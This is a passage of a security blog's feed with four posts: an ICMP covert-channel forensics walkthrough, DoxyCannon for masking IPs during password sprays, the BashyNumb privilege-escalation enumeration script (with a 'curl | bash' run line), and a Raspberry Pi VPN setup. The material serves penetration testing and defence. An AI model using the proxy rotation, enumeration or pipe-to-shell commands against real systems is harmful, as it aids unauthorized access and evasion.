applications, like <a href="https://www.owasp.org/index.php/OWASP_Juice_Shop_Project">OWASP's JuiceShop</a>,
are excellent tools for assisting in developing Secure Software Development Life-cycle programs
within an organization.</p>
<p>So let's take an exercise I recently came across in a CTF event. The skills required to solve the
challenge are actually quite useful in real-world defensive scenarios.</p>
<p><strong>Story Time</strong></p>
<p>You work for the Info Sec team of Acme Co. As part of your security toolset, you've set up an
Intrusion Detection System on a span port in your data center. During a routine Threat Hunting
exercise, your team discovers some anomalous traffic coming from a particular server. Your IDS
says that there was a strange amount of ICMP traffic coming from this machine. You go back to when
the traffic occurred and pull a packet capture during that time-frame and you open it in WireShark.</p>
<p>You scan around and see some normal looking traffic until you spot the flood of ICMP packets.</p>
<p><img src="2.png" alt=""></p>
<p>After filtering for the suspected packet type, you begin to analyze each packet and before long you
notice most of the ICMP packets consist of a <code>type</code> that WireShark doesn't recognize.</p>
<p><img src="3.png" alt=""></p>
<p>This is prime example of <em>&ldquo;never fully trust your tools&rdquo;</em>. ICMP has a defined
[set of possible &ldquo;good&rdquo; types]
(<a href="https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml#icmp-parameters-types)">https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml#icmp-parameters-types)</a>.
A legitimate ICMP request should only contain one of these predefined <code>types</code>. WireShark is
attempting to map a <code>type</code> to a plaintext definition, and failing to do so because these aren't
legitimate ICMP echo requests.</p>
<p>By scanning through the <code>type</code> flags of a few successive packets, we begin to suspect that these
values might be ASCII codes, given the lower/upper bounds. If we manually take the first 3 codes
<code>(71, 73, 70)</code> and convert them, we get:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">for</span> num in <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">73</span> 70; <span style="color:#66d9ef">do</span> 
  ascii<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;%03o&#39;</span> $num<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">\\</span><span style="color:#e6db74">${</span>ascii<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">done</span>

&gt; GIF
</code></pre></div><p>It appears we have a GIF file header in some ICMP traffic. Strange indeed.  At this point, we
decide that switching to a programatic approach might be easier. Python's <code>scapy</code> library is a handy
packet parsing tool I've used in the past.</p>
<p>Let's fire up the iPython REPL and import our tools:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> IP, ICMP, rdpcap
pcap <span style="color:#f92672">=</span> rdpcap(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">data.pcap</span><span style="color:#e6db74">&#39;</span>)
</code></pre></div><p>We're going to want to filter out all of our ICMP packets:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">packets <span style="color:#f92672">=</span> [p <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> pcap <span style="color:#66d9ef">if</span> ICMP <span style="color:#f92672">in</span> p]
</code></pre></div><p><img src="4.png" alt=""></p>
<p>Since the values used for the <code>type</code> flag span the entire ASCII range, it's a statistical
probability that this ICMP traffic will send a legitimate ICMP echo request. That means we'll get
legitimate responses in our PCAP data. We can isolate requests by specifying that we only want ICMP
packets that are <em>leaving</em> a particular source.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">packets <span style="color:#f92672">=</span> [p <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> packets <span style="color:#66d9ef">if</span> p[IP]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">10.136.255.127</span><span style="color:#e6db74">&#39;</span>]
</code></pre></div><p>Now we have a handle on all ICMP traffic leaving 10.136.255.127. The next step is to convert
everything from ASCII codes to their corresponding characters and write to disk.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># take type flag of each packet</span>
ascii <span style="color:#f92672">=</span> [p[ICMP]<span style="color:#f92672">.</span>type <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> packets]

<span style="color:#75715e"># convert them to character string</span>
chars <span style="color:#f92672">=</span> [chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ascii]
data <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(chars)

<span style="color:#75715e"># write the data to a file</span>
<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">mystery.file</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
    f<span style="color:#f92672">.</span>write(data)
</code></pre></div><p>What exactly is this file?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">file mystery.file
</code></pre></div><p><img src="5.png" alt=""></p>
<p>And we have our data. If we want to go back and clean up some of the code and make it somewhat
reusable&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> IP, ICMP, rdpcap

FILE <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">data.pcap</span><span style="color:#e6db74">&#39;</span>
SOURCE_IP <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">10.136.255.127</span><span style="color:#e6db74">&#39;</span>
PROTO <span style="color:#f92672">=</span> ICMP


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filter_op</span>(pkt):
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">Filter operation for [PROTO] and [SRC_IP]</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> PROTO <span style="color:#f92672">in</span> pkt <span style="color:#f92672">and</span> pkt[IP]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> SOURCE_IP

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ascii_convert</span>(pkt):
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">Map function to convert ASCII values to text</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> chr(pkt[PROTO]<span style="color:#f92672">.</span>type

server_icmp <span style="color:#f92672">=</span> filter(filter_op, rdpcap(FILE))
data <span style="color:#f92672">=</span> map(ascii_convert, server_icmp)

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">mystery.file</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(data))

</code></pre></div><p>In this example, our packet capture contained a single file, the GIF. Not a likely scenario in a
real-world investigation. If an attacker had initiated an ICMP shell or downloaded multiple files,
it would be difficult to tell where one file ends and another begins. In this example, <code>binwalk</code>
could help us extract the multiple files.</p>
<p>To simulate this scenario, add the following line to our script, just before with write-to-disk
operation:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">data <span style="color:#f92672">=</span> data <span style="color:#f92672">+</span> data <span style="color:#f92672">+</span> data
</code></pre></div><p>After running the python file again, we can run the resulting file through binwalk.</p>
<p><img src="6.png" alt=""></p>
<p>Binwalk was able to find 3 distinct files embedded in the dumped data from our script.</p>
<p><a href="data.pcap">Here's</a> the PCAP for those playing the home game. Happy hunting.</p>
]]></content>
        </item>
        
        <item>
            <title>Password Spraying with DoxyCannon</title>
            <link>https://sec.alexflor.es/posts/2018/04/password-spraying-with-doxycannon/</link>
            <pubDate>Mon, 16 Apr 2018 22:43:36 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2018/04/password-spraying-with-doxycannon/</guid>
            <description>Password sprays are here to stay. It&#39;s probably a good idea to configure some clever WAF rules, implement captcha systems, and set up additional alerting. But once implemented, how do you test and tune your protective measures?
Enter DoxyCannon
DoxyCannon&#39;s name borrows from ProxyCannon, a script that instantiates cloud infrastructure through which one can proxy requests. Unlike ProxyCannon, DoxyCannon gives you the same functionality without needing to rely on cloud providers.</description>
            <content type="html"><![CDATA[<p>Password sprays are here to stay. It's probably a good idea to configure some clever WAF rules,
implement captcha systems, and set up additional alerting. But once implemented, how do you test and
tune your protective measures?</p>
<p>Enter <a href="https://github.com/audibleblink/doxycannon">DoxyCannon</a></p>
<p>DoxyCannon's name borrows from ProxyCannon, a script that instantiates cloud infrastructure through
which one can proxy requests. Unlike ProxyCannon, DoxyCannon gives you the same functionality
without needing to rely on cloud providers. Everything is local. DoxyCannon will use Docker and a
collection of OpenVPN config files to create local proxies on localhost. In combination with tools
like proxychains or DoxyCannon's own DoxyProxy, you can shuffle through local proxies for each
request, masking the true IP of the attacking machine.</p>
<p>Let's see what this looks like on the receiving end. First, let's set up DoxyCannon.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git clone https://github.com/audibleblink/doxycannon
cd doxycannon
</code></pre></div><p>We're going to using Private Internet Access as our VPN provider.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">wget  https://www.privateinternetaccess.com/openvpn/openvpn.zip
unzip -d VPN openvpn.zip

<span style="color:#75715e"># Remove whitespace from the ovpn file names</span>
find . -name *ovpn | rename <span style="color:#e6db74">&#39;s/ /_/g&#39;</span>

<span style="color:#75715e"># Append `auth.txt` to the `user-pass-auth` directive</span>
sed -i <span style="color:#e6db74">&#39;s/pass/pass auth.txt/&#39;</span> VPN/*.ovpn

<span style="color:#75715e"># Create your auth.txt file</span>
echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>PIA_USER<span style="color:#e6db74">}</span><span style="color:#e6db74">\n</span><span style="color:#e6db74">${</span>PIA_PASS<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> &gt; VPN/auth.txt
</code></pre></div><p>Once everything's been set up, you can build the image and bring up your PIA containers.
<a href="001.jpg"><img src="001.jpg" alt=""></a></p>
<p>At this point, DoxyCannon has dynamically created a <code>proxychains.conf</code> file for you in the root of
the project directory:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#75715e"># proxychains.conf</span>
<span style="color:#75715e"># ------------------------------------------------------------------------</span>
<span style="color:#75715e"># This file is automatically generated by doxycannon. If you need changes,</span>
<span style="color:#75715e"># make them to the template string in doxycannon.py</span>
<span style="color:#a6e22e">random_chain</span>
<span style="color:#a6e22e">quiet_mode</span>
<span style="color:#a6e22e">proxy_dns</span>
<span style="color:#a6e22e">remote_dns_subnet 224</span>
<span style="color:#a6e22e">tcp_read_time_out 15000</span>
<span style="color:#a6e22e">tcp_connect_time_out 8000</span>

<span style="color:#66d9ef">[ProxyList]</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5000</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5001</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5002</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5003</span>
<span style="color:#66d9ef">[...snip]</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5042</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5043</span>
</code></pre></div><p>If you're using a console application for your spray, you're ready to go:
<a href="003.jpg"><img src="003.jpg" alt="003.jpg"></a></p>
<p>Here's what our web server access logs look like:
<a href="004.jpg"> <img src="004.jpg" alt="004.jpg"> </a></p>
<p>With the <code>--single</code> flag, DoxyCannon also has the ability to create a proxy rotator that provides a
single port at which one can point GUI applications.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Start DoxyProxy</span>
❯❯ ./doxycannon.py --single
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Writing HAProxy configuration
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Image doxyproxy built.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Staring single-port mode...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Proxy rotator listening on port 1337. Ctrl-c to quit
</code></pre></div><p>While DoxyProxy is running, applications like Burp Suite can be configured to use port 1337.
DoxyProxy is just another docker container. It runs HAProxy in a layer 4, round-robin
configuration and binds to the host network.</p>
<p><a href="005.jpg"><img src="005.jpg" alt="005.jpg"></a>
<a href="006.jpg"><img src="006.jpg" alt="006.jpg"></a>
<a href="007.jpg"><img src="007.jpg" alt="007.jpg"></a></p>
<p>I'm still adding features to DoxyProxy. Coming up will be the ability to control remote docker
hosts using the official docker sdk.</p>
]]></content>
        </item>
        
        <item>
            <title>BashyNumb.sh</title>
            <link>https://sec.alexflor.es/posts/2017/08/bashynumb.sh/</link>
            <pubDate>Tue, 22 Aug 2017 22:47:45 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2017/08/bashynumb.sh/</guid>
            <description>I&#39;ve been running into more and more Linux boxes that don&#39;t have python 2 installed. It&#39;s been a little frustrating since I like to use a slightly modified version of the famous linuxprivchecker.py that almost all OSCP students know and love. I&#39;m lazy and hate manual enumeration; makes my fingers go numb. I decided to spend an evening translating it to python 3, but quickly realized, &amp;ldquo;This python is just invoking shell commands, why am I doing this?</description>
            <content type="html"><![CDATA[<p>I've been running into more and more Linux boxes that don't have python 2 installed. It's been a
little frustrating since I like to use a slightly modified version of the famous
<code>linuxprivchecker.py</code> that almost all OSCP students know and love.  I'm lazy and hate manual
enumeration; makes my fingers go numb. I decided to spend an evening translating it to python 3,
but quickly realized, &ldquo;This python is just invoking shell commands, why am I doing this?&rdquo;</p>
<p>So I made BashyNumb. It's currently only tested on debian-based systems, but I'm looking to
accommodate others as well. I'm at the mercy of bash when it comes to formatting, but hey, as long
as the info is there, I'm good.</p>
<p>Check it out at <a href="https://github.com/audibleblink/bashynumb">https://github.com/audibleblink/bashynumb</a>.</p>
<p>I'll be running it with <code>curl -sL git.io/bashynumb | bash</code>, but you probably shouldn't. =P</p>
<p>Here's the 1st iteration, but always check github for the newest version.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/env bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># Thanks to arr0way for the section and banner code and some of the</span>
<span style="color:#75715e"># enum calls - https://highon.coffee/blog/linux-local-enumeration-script</span>

BLACK<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[30m&#34;</span>
RED<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[31m&#34;</span>
GREEN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[32m&#34;</span>
YELLOW<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[33m&#34;</span>
BLUE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[34m&#34;</span>
PINK<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[35m&#34;</span>
CYAN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[36m&#34;</span>
WHITE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[37m&#34;</span>
NORMAL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[0;39m&#34;</span>

printf <span style="color:#e6db74">&#34;</span>$GREEN<span style="color:#e6db74">&#34;</span>
/bin/cat &lt;&lt; <span style="color:#e6db74">&#34;EOF&#34;</span>
  _                _                             _
 | |              | |                           | |
 | | _   ____  ___| | _  _   _ ____  _   _ ____ | | _
 | <span style="color:#f92672">||</span> <span style="color:#ae81ff">\ </span>/ _  |/___<span style="color:#f92672">)</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">\|</span> | | |  _ <span style="color:#ae81ff">\|</span> | | |    <span style="color:#ae81ff">\|</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span> | |_<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span> | |___ | | | | |_| | | | | |_| | | | | |_<span style="color:#f92672">)</span> <span style="color:#f92672">)</span>
 |____/ <span style="color:#ae81ff">\_</span><span style="color:#f92672">||</span>_<span style="color:#f92672">(</span>___/|_| |_|<span style="color:#ae81ff">\_</span>_  |_| |_|<span style="color:#ae81ff">\_</span>___|_|_|_|____/
                        <span style="color:#f92672">(</span>____/
EOF
printf <span style="color:#e6db74">&#34;</span>$NORMAL<span style="color:#e6db74">&#34;</span>
printf <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Version: </span>$YELLOW<span style="color:#e6db74"> 1.0 </span>$NORMAL<span style="color:#e6db74"> \n</span><span style="color:#e6db74">&#34;</span>
printf <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Twitter: </span>$BLUE<span style="color:#e6db74"> @4lex </span>$NORMAL<span style="color:#e6db74"> \n</span><span style="color:#e6db74">&#34;</span>
printf <span style="color:#e6db74">&#34;\n&#34;</span>
printf <span style="color:#e6db74">&#34;</span>$RED<span style="color:#e6db74"> Disclaimer: Use this &#39;software&#39; at your own risk. </span>$NORMAL<span style="color:#e6db74">  \n</span><span style="color:#e6db74">&#34;</span>
sleep <span style="color:#ae81ff">1</span>

<span style="color:#66d9ef">function</span> section<span style="color:#f92672">(</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#34;</span>$BLUE<span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#39;%*s\n&#39;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>COLUMNS<span style="color:#66d9ef">:-</span><span style="color:#66d9ef">$(</span>tput cols<span style="color:#66d9ef">)</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#39;&#39;</span> | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;#&#39;</span>
  printf <span style="color:#e6db74">&#34;##&#34;</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#34;</span>$RED<span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#34;</span>$BLUE<span style="color:#e6db74">## </span>$RED<span style="color:#e6db74"> </span>$@<span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#34;</span>$BLUE<span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#34;##&#34;</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#39;%*s\n&#39;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>COLUMNS<span style="color:#66d9ef">:-</span><span style="color:#66d9ef">$(</span>tput cols<span style="color:#66d9ef">)</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#39;&#39;</span> | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;#&#39;</span>
  printf <span style="color:#e6db74">&#34;</span>$NORMAL<span style="color:#e6db74">&#34;</span>
<span style="color:#f92672">}</span>

section <span style="color:#e6db74">&#34;Current User Info&#34;</span>
/usr/bin/id
echo
/bin/hostname

section <span style="color:#e6db74">&#34;Linux Version&#34;</span>
/bin/cat /etc/issue;
echo
/bin/cat /etc/*-release

section <span style="color:#e6db74">&#34;Kernel Info&#34;</span>
/bin/uname -ar

section <span style="color:#e6db74">&#34;Network Info&#34;</span>
/bin/cat /etc/sysconfig/network
echo
/bin/cat /etc/resolv.conf
echo
ifconfig -a<span style="color:#f92672">||</span> ip addr
echo
route <span style="color:#f92672">||</span> ip route

section <span style="color:#e6db74">&#34;Active Listening Services&#34;</span>
/bin/netstat -tulpn 

section <span style="color:#e6db74">&#34;File System Info&#34;</span>
/bin/df -h
echo
/bin/mount | column -t
echo
/bin/cat /etc/fstab

section <span style="color:#e6db74">&#34;Users&#34;</span>
/bin/cat /etc/passwd

section <span style="color:#e6db74">&#34;Groups&#34;</span>
/bin/cat /etc/group

section <span style="color:#e6db74">&#34;SUID Files&#34;</span>
/usr/bin/find / -perm -g<span style="color:#f92672">=</span>s -o -perm -4000 ! -type l -exec ls -ld <span style="color:#f92672">{</span><span style="color:#f92672">}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null

section <span style="color:#e6db74">&#34;World Writable Directories&#34;</span>
/usr/bin/find / -perm -222 -type d 2&gt;/dev/null

section <span style="color:#e6db74">&#34;World Writable Files&#34;</span>
/usr/bin/find / -type f -perm <span style="color:#ae81ff">0777</span> 2&gt;/dev/null

section <span style="color:#e6db74">&#34;Root-owned, Writable Files&#34;</span>
find / -type f -user root -writable -exec ls -ld <span style="color:#f92672">{</span><span style="color:#f92672">}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null

section <span style="color:#e6db74">&#34;Root-owned, Writable and Executable Files&#34;</span>
find / -type f -executable -user root -writable -exec ls -ld <span style="color:#f92672">{</span><span style="color:#f92672">}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null

section <span style="color:#e6db74">&#34;Current User Sessions&#34;</span>
/usr/bin/w

section <span style="color:#e6db74">&#34;Processes Running as root&#34;</span>
/bin/ps -ef | /bin/grep root | /bin/grep -ve <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">\]</span>$<span style="color:#e6db74">&#34;</span>

section <span style="color:#e6db74">&#34;Commands User Can Run with sudo&#34;</span>
test <span style="color:#f92672">[</span> echo <span style="color:#ae81ff">1</span> | sudo -S -l <span style="color:#f92672">]</span> 2&gt;/dev/null <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>USER<span style="color:#e6db74">}</span><span style="color:#e6db74"> has no passwordless sudo commands configured</span><span style="color:#e6db74">&#34;</span>

section <span style="color:#e6db74">&#34;Cron Info&#34;</span>
/bin/ls -lah /etc/cron*
echo
/bin/cat /etc/crontab
echo
/usr/bin/crontab -l

section <span style="color:#e6db74">&#34;Installed Packages&#34;</span>
/usr/bin/dpkg --list
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Creating a VPN Access Point</title>
            <link>https://sec.alexflor.es/posts/2017/08/creating-a-vpn-access-point/</link>
            <pubDate>Fri, 18 Aug 2017 20:07:36 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2017/08/creating-a-vpn-access-point/</guid>
            <description>By now, there shouldn&#39;t be any doubt that not only are you being watched online, but your browsing habits, particularly your political ones, are of interest to the current administration. The idea of watch-lists and registries have been decried by conservatives and progressives alike. This should strike a chord with conservatives, who&#39;ve protested gun registrations and national ID cards, as it demonstrates the governmental over-reach that conservatives often denounce. It should strike a chord with progressives, whose demonstrations against faith-based registries have sprouted up across the country in the last year.</description>
            <content type="html"><![CDATA[<p><img src="./ussurveils1200.jpeg" alt=""></p>
<p>By now, there shouldn't be
<a href="https://www.congress.gov/bill/115th-congress/house-joint-resolution/86">any doubt</a>
that not only are you being watched online, but your browsing habits, particularly your political ones, are of
<a href="https://www.dreamhost.com/blog/wp-content/uploads/2017/08/DH-Search-Warrant.pdf">interest to the current administration</a>.
The idea of watch-lists and registries have been decried by conservatives and progressives alike.
This should strike a chord with conservatives, who've protested gun registrations and national ID cards,
as it demonstrates the governmental over-reach that conservatives often denounce.
It should strike a chord with progressives, whose demonstrations against faith-based registries
have sprouted up across the country in the last year.</p>
<p>At an intersection on this dark road, we also have an accessibility problem when it comes to protecting ourselves.
Mention VLANs or Tor nodes to the average person and you're likely to be on the receiving end of blank stares.
The ability for Americans to protect themselves is currently a privilege afforded only to those with the resources and schooling needed to do so.
Look, this stuff is hard. And the total knowledge needed to protect oneself cannot be wedged into a single post.</p>
<p>Therefore, this post is aimed at other tech-savvy Americans with the means and desire to protect others.
By providing a reference of easily reproducible steps to create VPN access points in under 15 minutes,
I'm hoping that these access points cost so little in setup time and money,
that they can then be gifted freely so that fellow Americans can also protect themselves from
over-reaching governments or advertising companies that carelessly handle personal information.</p>
<h2 id="setup">Setup</h2>
<h3 id="items-needed">Items Needed</h3>
<ul>
<li>Working Raspberry Pi</li>
<li>Wireless Dongle</li>
<li>Ethernet cable</li>
<li>Install Script</li>
</ul>
<h3 id="presetup">Pre-setup</h3>
<p>Ensure that you have a working Raspberry Pi with a fresh install of the latest Raspbian OS. I'm
sure many other Linux distributions would work with little to no tweaking, but I've only ever
tested this on Raspbian. See
<a href="https://www.raspberrypi.org/downloads/raspbian/">here for instructions</a>
on getting that set up.</p>
<p>After installing the OS to the MicroSD card and before booting, create a blank file called <code>ssh</code>
in the boot partition of the SD card, so the SSH server is started on first run. As of some time in
2016, ssh if off by default, but the boot process searches for this file to know whether to turn
the service on or not.</p>
<p>You'll also need a PrivateInternetAccess account and you'll need to provide credentials to the
script so the VPN tunnel can start at boot time.</p>
<p><em>Aside:</em> Despite being a USA-based company under 5-eyes jurisdiction, PIA's claims that they don't
log customer traffic has
<a href="https://torrentfreak.com/vpn-providers-no-logging-claims-tested-in-fbi-case-160312/">been put to the test</a>
in court. They can't turn over what they don't have.</p>
<h3 id="steps">Steps</h3>
<ol>
<li>
<p>Boot your Pi with Ethernet and WiFi adapter plugged in. Make sure your computer is on the same network.</p>
</li>
<li>
<p>SSH in to the Pi. I used <code>nmap --open -p 22 192.168.1.1/24</code> to find the IP.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># default password is raspberry
ssh -l pi 192.168.1.200
</code></pre></li>
<li>
<p>CHANGE THE PASSWORD!</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo passwd pi
</code></pre></li>
<li>
<p>Become root</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo su
cd /root
</code></pre></div></li>
<li>
<p>Download the setup script and run it as root. (Walkthrough of the script at the end of the post)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># download</span>
wget https://raw.githubusercontent.com/audibleblink/vpn_access_point/master/setup.sh
<span style="color:#75715e"># read and configure it</span>
$EDITOR setup.sh
<span style="color:#75715e"># run it</span>
bash setup.sh
</code></pre></div></li>
<li>
<p>Reboot</p>
</li>
</ol>
<p>If everything went well, when the Pi boots back up, there should be a new WiFi network in the area.
Log into it and visit <a href="https://www.privateinternetaccess.com/">https://www.privateinternetaccess.com/</a>. You should see this happy little
green text near the top of the page.</p>
<p><img src="./success.png" alt=""></p>
<h3 id="script-walkthrough">Script Walkthrough</h3>
<p>Below you'll find the script as it was during the writing of this blog post, but with additional comments.
For the most up-to-date version, check out <a href="https://github.com/audibleblink/vpn_access_point/">https://github.com/audibleblink/vpn_access_point/</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
<span style="color:#75715e">#!/usr/bin/env bash</span>

<span style="color:#75715e"># SETTINGS</span>

<span style="color:#75715e">## Typical Settings</span>
pi_lan<span style="color:#f92672">=</span>192.168.42.1             <span style="color:#75715e"># the adapter&#39;s address on the Pi</span>
pi_network<span style="color:#f92672">=</span>192.168.42.0         <span style="color:#75715e"># the network for access point clients</span>
ap_ssid<span style="color:#f92672">=</span>my_vpn_ap               <span style="color:#75715e"># the access point name</span>
ap_password<span style="color:#f92672">=</span>dontspyonme         <span style="color:#75715e"># the access point password</span>
ap_channel<span style="color:#f92672">=</span><span style="color:#ae81ff">11</span>                   <span style="color:#75715e"># the access point channel</span>
ovpn_user<span style="color:#f92672">=</span>xxxx                  <span style="color:#75715e"># PIA account username</span>
ovpn_pass<span style="color:#f92672">=</span>yyyy                  <span style="color:#75715e"># PIA account password</span>
